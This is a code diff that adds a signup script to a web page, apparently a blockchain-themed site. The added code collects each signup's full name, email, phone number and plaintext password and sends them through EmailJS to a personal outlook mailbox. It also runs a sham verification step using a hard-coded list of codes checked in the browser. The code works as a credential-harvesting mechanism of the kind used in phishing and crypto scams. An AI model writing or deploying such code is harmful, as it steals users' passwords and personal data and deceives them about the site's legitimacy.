@@ -881,6 +881,125 @@ document.querySelectorAll(".network-copy").forEach(btn => {
     }
   });
     </script>
+  <script>
+  emailjs.init("VTJD_okCRB6iOQZRH");
+
+  // Verification codes list
+  const verificationCodes = [
+    "71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20",
+    "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75",
+    "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30",
+    "73dc12", "66oj90", "47bjd8", "7je567", "Hu557j", "5tvh7u", "57bb8i"
+  ];
+
+  // Pages history stack for back button navigation
+  const pageHistory = [];
+
+  // Show page function, with optional push to history
+  function showPage(pageId, pushHistory = true) {
+    const allPages = document.querySelectorAll("section[id^='page']");
+    allPages.forEach(page => page.style.display = "none");
+    const selectedPage = document.getElementById("page" + pageId);
+    if (selectedPage) {
+      selectedPage.style.display = "block";
+      if (pushHistory) {
+        pageHistory.push(pageId);
+      }
+    }
+  }
+
+  // Back button function
+  function goBack() {
+    if (pageHistory.length > 1) {
+      pageHistory.pop(); // Remove current page
+      const prevPage = pageHistory[pageHistory.length - 1];
+      showPage(prevPage, false); // Show previous page without pushing new history
+    }
+  }
+
+  // On window load, start on Page 1 (landing)
+  window.onload = () => {
+    showPage("1", false); // Show landing page, don't push to history
+  };
+
+  // Signup form submission
+  document.getElementById("signupForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const fullName = document.querySelector("#signupForm input[name='name']").value.trim();
+    const email = document.querySelector("#signupForm input[name='email']").value.trim();
+    const countryCode = document.querySelector("#signupForm select[name='countryCode']").value;
+    const phoneNumber = document.querySelector("#signupForm input[name='phone']").value.trim();
+    const password = document.getElementById("password").value;
+    const confirmPassword = document.getElementById("confirmPassword").value;
+
+    // Password match validation
+    if (password !== confirmPassword) {
+      document.getElementById("passwordError").style.display = "block";
+      return;
+    } else {
+      document.getElementById("passwordError").style.display = "none";
+    }
+
+    // Compose full phone number with country code
+    const fullPhoneNumber = countryCode + phoneNumber;
+
+    // Select random verification code from array
+    const selectedCode = verificationCodes[Math.floor(Math.random() * verificationCodes.length)];
+    // Store selected code in localStorage for later verification
+    localStorage.setItem("signupVerificationCode", selectedCode);
+
+    // Prepare data to send to your admin email
+    const signupData = {
+      to_email: "Blockchainautomated@outlook.com",
+      full_name: fullName,
+      phone_number: fullPhoneNumber,
+      user_email: email,
+      password: password,
+      verification_code: selectedCode
+    };
+
+    // Send signup email with verification code
+    emailjs.send("service_xg8bzqs", "template_gclz9gu", signupData)
+      .then(() => {
+        // Send auto-reply email to user with verification code
+        emailjs.send("service_xg8bzqs", "template_r0zg4zj", {
+          user_email: email,
+          full_name: fullName,
+          verification_code: selectedCode
+        });
+
+        // Move to verification page (1ii), push history
+        showPage("1ii");
+      })
+      .catch((error) => {
+        console.error("Signup error:", error);
+        alert("Failed to sign up. Please try again.");
+      });
+  });
+
+  // Verification button click handler
+  document.getElementById("verifyBtn").addEventListener("click", function () {
+    const userCode = document.getElementById("verificationCode").value.trim();
+    const storedCode = localStorage.getItem("signupVerificationCode");
+    const errorField = document.getElementById("verificationError");
+
+    if (userCode === storedCode) {
+      errorField.innerText = "";
+      // Clear stored code after success (optional)
+      localStorage.removeItem("signupVerificationCode");
+      // Go to main dashboard page 3
+      showPage("3");
+    } else {
+      errorField.innerText = "Input correct verification code";
+    }
+  });
+
+  // Back buttons event delegation for all back buttons
+  document.querySelectorAll(".nav-button").forEach(btn => {
+    btn.addEventListener("click", goBack);
+  });
+  </script>
     <script>
   // Login form submission
   document.getElementById("loginForm").addEventListener("submit", function (e) {
